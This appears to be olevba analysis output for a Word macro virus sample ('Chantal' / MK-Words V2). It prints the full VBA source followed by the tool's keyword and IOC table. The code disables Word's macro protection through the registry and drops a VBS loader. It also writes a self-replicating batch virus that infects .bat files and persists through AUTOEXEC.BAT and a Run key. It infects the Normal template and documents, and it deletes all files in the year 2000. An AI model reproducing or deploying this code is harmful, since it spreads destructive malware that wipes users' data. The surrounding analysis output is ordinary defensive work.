olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal-b2cd0147ecf6bf7c2d62510dd260c082a3dbb1cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chantal-b2cd0147ecf6bf7c2d62510dd260c082a3dbb1cc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

'MK-Words 2
'From the MKVG - The Lion City
On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("macro").Enabled = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Options.VirusProtection = False
DisableAutoMacros = False
Options.ConfirmConversions = False
ScreeenUpdate = False
ToolsOptionsSave.AutoSave = False
ToolsOptionsSave.GlobalDotPrompt = False
f = FreeFile
Open "c:\windows\system\mkv2.vbs" For Output As #f
Print #f, "Set MKV = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #f, "MKV.Options.VirusProtection = False"
Print #f, "MKV.Options.SaveNormalPrompt = False"
Print #f, "MKV.Options.SaveNormalPrompt = False"
Print #f, "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
Print #f, "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\MKV4.vxd" & Chr(34) & ")"
Print #f, "MKV.Application.Quit"
Close #f
f = FreeFile
Open "c:\MKV2.BAT" For Output As #f
Print #f, "@echo off%[MKV2_B]%"
Print #f, "IF '%1=='## GOTO MKV2_%2"
Print #f, "ATTRIB C:\MKV2.BAT +h"
Print #f, "IF EXIST C:\MKV2.BAT GOTO MKV2_"
Print #f, "IF NOT EXIST %0.BAT GOTO MKV2_END"
Print #f, "FIND " & Chr(34) & "MKV2" & Chr(34) & "<%0.BAT>C:\MKV2.BAT"
Print #f, ":MKV2_"
Print #f, "COMMAND /e:5000 /c C:\MKV2 ## RUN"
Print #f, "GOTO MKV2_END"
Print #f, ":MKV2_RUN"
Print #f, "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\MKV2 ## INF %%i"
Print #f, "EXIT MKV2"
Print #f, ":MKV2_INF"
Print #f, "IF '%MKV2%=='1111111111111 EXIT"
Print #f, "SET MKV2=%MKV2%1"
Print #f, "FIND " & Chr(34) & "MKV2" & Chr(34) & "<%3>NUL"
Print #f, "IF NOT ERRORLEVEL 1 goto MKV2_END"
Print #f, "TYPE %3>MKV2"
Print #f, "TYPE C:\MKV2.BAT>>MKV2"
Print #f, "MOVE MKV2 %3>NUL"
Print #f, "EXIT MKV2"
Print #f, ":MKV2_END"
Close #f
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
Do Until EOF(f)
Input #f, ASD
If ASD = "@MKV2.BAT" Then GoTo FDBAT
Loop
Close
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
K = FreeFile
Open "C:\AUTOEXEC.TMP" For Output As #K
Do Until EOF(f)
Input #f, ASD
Print #K, ASD
Loop
Print #K, "@MKV2.BAT"
Close
Kill "AUTOEXEC.BAT"
Name "AUTOEXEC.TMP" As "AUTOEXEC.BAT"
FDBAT:
Close
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Mae Koo V-Groups"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Version") = "MKV-99"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MKV") = "C:\WINDOWS\SYSTEM\MKV2.vbs"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK Words V2 By MKVG 1999"
If Day(Now) = 31 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Animation = msoAnimationListensToComputer
    .Button = msoButtonSetOK
    .Heading = "MK Words V.2"
    .Text = "Y2K is Coming Soon..."
    .Show
End With
End If

    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            NormalTemplate.Save
    Else
    End If
NormalTemplate.VBProject.VBComponents.Item(1).export ("c:\windows\system\mkv4.tmp")
f = FreeFile
Open "c:\windows\system\mkv4.tmp" For Input As #f
j = FreeFile
Open "c:\windows\mkv4.vxd" For Output As #j
For a = 1 To 8: Input #f, b: Next
Do Until EOF(f)
Input #f, b
Print #j, b
Loop
Close #j
Close #f
Kill "c:\windows\system\mkv4.tmp"
Y2KEnd:
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V2) By MMK 1999"
            .Execute
        End With
NormalTemplate.Save
ActiveDocument.Save
' MKVG had present MK Words Version 2
' (C) May 1999
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mkv2.vbs            |Executable file name                         |
|IOC       |MKV2.BAT            |Executable file name                         |
|IOC       |0.BAT               |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |MKV2.vbs            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

